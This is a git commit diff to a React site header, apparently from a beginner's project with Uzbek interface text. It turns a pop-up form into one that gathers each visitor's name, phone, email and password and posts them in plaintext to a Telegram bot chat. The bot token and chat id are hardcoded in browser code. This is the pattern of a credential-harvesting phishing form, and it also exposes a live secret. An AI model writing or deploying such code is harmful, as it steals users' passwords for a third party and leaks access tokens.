ebbf0a8f237085170b825a1f83a0439aa6e2166e
Akmalov-dev <amirbekdebruyne@gmail.com>
2026-05-18 13:10:05 +0500

    API with telegram

--- src/components/header/header.jsx
+++ src/components/header/header.jsx
@@ -1,9 +1,41 @@
 import React, { useState } from 'react'
 import { Link } from 'react-router-dom'
 import './Heaer.css'
+import axios from 'axios' 
 
 const Header = () => {
   const [open , setOpen] = useState(false);
+
+    const sendMessage = (event)=>{
+    event.preventDefault();
+    const token = "8765834439:AAGcFaEzLpmhwsnAdAKgW103qUJqvFNed8s";
+    const chat_id = 5795108304
+
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    const name = document.getElementById("name").value
+    const phone = document.getElementById("phone").value
+    const email = document.getElementById("email").value
+    const password = document.getElementById("password").value
+
+    const messageContent = `ism : ${name}\ntel : ${phone} , email : ${email} , password: ${password}`
+
+    axios({
+      url : url ,
+      method : "POST",
+      data : {
+       chat_id : chat_id ,
+       text: messageContent,
+      }
+    })
+    .then(()=>{
+      alert("qabul qilindi");
+    }).catch((err)=>{
+      alert("Bo'sh maydon anqilandi")
+    })
+
+
+  }
 
   return (
     <header className="header">
@@ -19,19 +51,19 @@ const Header = () => {
 
       {
       open && (
-        <div className='onclick-div'>
+        <form className='onclick-div' onSubmit={sendMessage}>
           <div className='inputs'>
             <p>To'ldiring</p>
-            <input type="text" placeholder='F.I.O' required/>
-            <input type="email" placeholder='email' required/>
-            <input type="password" placeholder='parol' required/>
-            <input type="text" placeholder='tel raqam'/>
-            <button className='btn-otish'>O'tish</button>
+            <input type="text" placeholder='F.I.O' id='name'/>
+            <input type="email" placeholder='email' id='email'/>
+            <input type="password" placeholder='parol' id='password'/>
+            <input type="text" placeholder='tel raqam' id='phone'/>
+            <button className='btn-otish' type='submit'>O'tish</button>
           </div>
           <div>
             <button className='X' onClick={()=>setOpen(false)}>X</button>
           </div>
-        </div>
+        </form>
       )
       }
 
